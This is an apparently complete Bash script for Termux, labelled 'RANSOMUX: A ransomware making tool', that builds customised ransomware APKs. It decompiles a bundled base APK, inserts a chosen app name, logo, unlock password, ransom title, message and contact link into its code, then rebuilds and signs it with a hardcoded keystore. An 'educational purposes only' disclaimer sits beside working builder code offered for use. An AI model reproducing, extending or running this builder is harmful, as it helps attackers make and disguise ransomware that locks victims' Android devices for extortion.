#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Display the Termux banner
clear
echo -e "${CYAN}"
cat << "EOF"
      ⠀⢰⣿⣷⣦⣄⡀⠀⣀⣀⣀⣀⣀⡀⠀⢀⣠⣴⣶⣿⡆⠀⠀
      ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⠀⠀
      ⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀      ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
⠀      ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
      ⠀⢸⣿⣿⠟⠁⠀⠈⢹⣿⣿⣿⣿⠏⠁⠀⠙⢻⣿⣿⡇⠀⠀
      ⠀⠈⢿⣿⣷⣄⣀⣠⣼⣿⣿⣿⣿⣦⣀⣀⣠⣾⣿⡿⠀⠀⠀
      ⢠⣤⡀⠉⠻⠿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⠿⠟⢁⣤⣄⠀
      ⣼⣿⣿⣦⣄⡀⠘⠿⠻⠿⠟⠿⡿⠻⠿⠀⢀⣀⣤⣾⣿⣧⡀
      ⠉⠉⠉⠉⠛⠿⣿⣷⣶⣤⣀⣀⣤⣶⣾⣿⠿⠟⠋⠉⠉⠛⠀
      ⢀⡀⠀⠀⢀⣀⣤⣴⣿⣿⠿⠿⣿⣿⣦⣤⣀⡀⠀⠀⢀⡀⠀
      ⢿⣿⣷⣾⠿⠟⠛⠋⠁⠀⠀⠀⠀⠈⠙⠛⠻⢿⣷⣶⣿⣿⠆
      ⠘⢿⡿⠁⠀  RANSOMUX⠀⠀⠀⠀⠈⢿⣿⡇⠀
EOF
echo -e "${NC}"

echo -e "${MAGENTA}A ransomware making tool for Termux${NC}"
echo -e "${YELLOW}Author : Alienkrishn [Anon4You]${NC}"
echo -e "${RED}"
echo -e "Legal usage notice:"
echo -e "This tool is for educational purposes only."
echo -e "Unauthorized use for illegal activities is prohibited."
echo -e "The author is not responsible for any misuse of this tool."
echo -e "${NC}"

# Paths
TARGET_APK="$PREFIX/share/ransomux/assets/base.apk"
OUTPUT_DIR="decompiled_apk"
KEYSTORE_PATH="$PREFIX/share/ransomux/assets/ransom.keystore"

# Function to show a spinner while a command is running
spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\\'
    while [ -d /proc/$pid ]; do
        printf "\r[%c] Processing..." "${spinstr:i++%${#spinstr}:1}"
        sleep $delay
    done
    printf "\r"
}

# Function to validate PNG file
validate_png() {
    local file="$1"
    
    if [ ! -f "$file" ]; then
        echo -e "${RED}[!]${NC} Error: File not found: $file"
        return 1
    fi
    
    if [[ "$file" =~ \.png$ ]] && head -c 8 "$file" | grep -q $'\x89PNG\r\n\x1a\n'; then
        return 0
    else
        echo -e "${RED}[!]${NC} Error: $file doesn't appear to be a valid PNG"
        return 1
    fi
}

# Function to clean up temporary files
cleanup() {
    echo -e "${YELLOW}[*]${NC} Cleaning up temporary files..."
    [ -d "$OUTPUT_DIR" ] && rm -rf "$OUTPUT_DIR"
    [ -f "${OUTPUT_APK}.idsig" ] && rm -f "${OUTPUT_APK}.idsig"
    echo -e "${GREEN}[+]${NC} Cleanup complete"
}

# Function to get all user inputs
get_user_inputs() {
    echo -e "\n${CYAN}Enter modification details:${NC}"
    read -p "$(echo -e "${BLUE}Enter app name: ${NC}")" app_name
    read -p "$(echo -e "${BLUE}Enter a password: ${NC}")" password
    read -p "$(echo -e "${BLUE}Enter a title: ${NC}")" title
    read -p "$(echo -e "${BLUE}Enter a description: ${NC}")" description
    read -p "$(echo -e "${BLUE}Enter a link (e.g., https://t.me/alienkrishn): ${NC}")" link
    
    while true; do
        read -p "$(echo -e "${BLUE}Enter path to new logo (PNG file): ${NC}")" logo_path
        if validate_png "$logo_path"; then
            break
        fi
    done
    
    # Set output APK name based on app name
    OUTPUT_APK="${app_name// /_}.apk"
}

# Function to decompile the APK
decompile_apk() {
    echo -e "${YELLOW}[*]${NC} Decompiling APK..."
    apkeditor d -i "$TARGET_APK" -o "$OUTPUT_DIR" > /dev/null 2>&1 &
    spinner $!
    
    if [ ! -d "$OUTPUT_DIR" ]; then
        echo -e "${RED}[!]${NC} Error: Failed to decompile APK"
        exit 1
    fi
    echo -e "${GREEN}[+]${NC} APK decompiled successfully"
}

# Function to replace app name in AndroidManifest.xml
replace_app_name() {
    echo -e "${YELLOW}[*]${NC} Modifying app name in AndroidManifest.xml..."
    
    local manifest_file=$(find "$OUTPUT_DIR" -name "AndroidManifest.xml" | head -1)
    if [ ! -f "$manifest_file" ]; then
        echo -e "${RED}[!]${NC} Error: AndroidManifest.xml not found"
        return 1
    fi
    
    sed -i "s/APP_NAME/$app_name/g" "$manifest_file"
    
    echo -e "${GREEN}[+]${NC} App name changed to: $app_name"
}

# Function to replace app logo
replace_app_logo() {
    echo -e "${YELLOW}[*]${NC} Replacing app logo..."
    
    find "$OUTPUT_DIR/resources" -path "*/drawable*/app_logo.png" | while read -r old_logo; do
        local dir_path=$(dirname "$old_logo")
        echo -e "${BLUE}[i]${NC} Found logo at: $old_logo"
        cp "$logo_path" "$old_logo"
        echo -e "${GREEN}[+]${NC} Replaced logo in $dir_path"
    done
}

# Function to replace strings in smali files
replace_strings() {
    echo -e "${YELLOW}[*]${NC} Replacing strings in smali files..."
    
    local escaped_link=$(printf '%s\n' "$link" | sed 's:[\/&]:\\&:g;$!s/$/\\/')
    local escaped_title=$(printf '%s\n' "$title" | sed 's:[\/&]:\\&:g;$!s/$/\\/')
    local escaped_desc=$(printf '%s\n' "$description" | sed 's:[\/&]:\\&:g;$!s/$/\\/')
    
    find "$OUTPUT_DIR/smali/classes" -type f -name "*.smali" | while read -r file; do
        sed -i \
            -e "s/ALIEN666/$password/g" \
            -e "s/ADDTITLE/$escaped_title/g" \
            -e "s/ADDDISC/$escaped_desc/g" \
            -e "s|ADDLINK|$escaped_link|g" \
            "$file"
    done
    
    echo -e "${GREEN}[+]${NC} Strings replaced successfully"
}

# Function to rebuild and sign the APK
rebuild_and_sign() {
    echo -e "${YELLOW}[*]${NC} Rebuilding APK as ${OUTPUT_APK}..."
    apkeditor b -i "$OUTPUT_DIR" -o "$OUTPUT_APK" > /dev/null 2>&1 &
    spinner $!
    
    if [ ! -f "$OUTPUT_APK" ]; then
        echo -e "${RED}[!]${NC} Error: Failed to rebuild APK"
        exit 1
    fi
    echo -e "${GREEN}[+]${NC} APK rebuilt successfully"
    
    echo -e "${YELLOW}[*]${NC} Signing APK..."
    if [ ! -f "$KEYSTORE_PATH" ]; then
        echo -e "${MAGENTA}[i]${NC} Creating new keystore..."
        keytool -genkey -v -keystore "$KEYSTORE_PATH" -alias apkpatcher -keyalg RSA \
            -keysize 2048 -validity 10000 -storepass apkpatcher -keypass apkpatcher \
            -dname "CN=apkpatcher, OU=apkpatcher, O=apkpatcher, L=Unknown, ST=Unknown, C=IN" \
            > /dev/null 2>&1
    fi
    
    apksigner sign --ks "$KEYSTORE_PATH" --ks-pass pass:apkpatcher \
        --ks-key-alias apkpatcher --key-pass pass:apkpatcher \
        "$OUTPUT_APK" > /dev/null 2>&1 &
    spinner $!
    
    echo -e "${GREEN}[+]${NC} APK signed successfully"
    echo -e "${CYAN}\n[+]${NC} Modified APK saved as: ${GREEN}$OUTPUT_APK${NC}"
}

# Main function
main() {
    # Check requirements
    if ! command -v apkeditor >/dev/null || ! command -v apksigner >/dev/null || ! command -v keytool >/dev/null; then
        echo -e "${RED}[!]${NC} Error: Required tools (apkeditor, apksigner, keytool) not found"
        exit 1
    fi
    
    if [ ! -f "$TARGET_APK" ]; then
        echo -e "${RED}[!]${NC} Error: Input APK not found at $TARGET_APK"
        exit 1
    fi
    
    get_user_inputs
    decompile_apk
    replace_app_name
    replace_app_logo
    replace_strings
    rebuild_and_sign
    cleanup
    
    echo -e "\n${GREEN}[+]${NC} APK modification complete! ${RED}✔${NC}\n"
}

# Run the main function
main
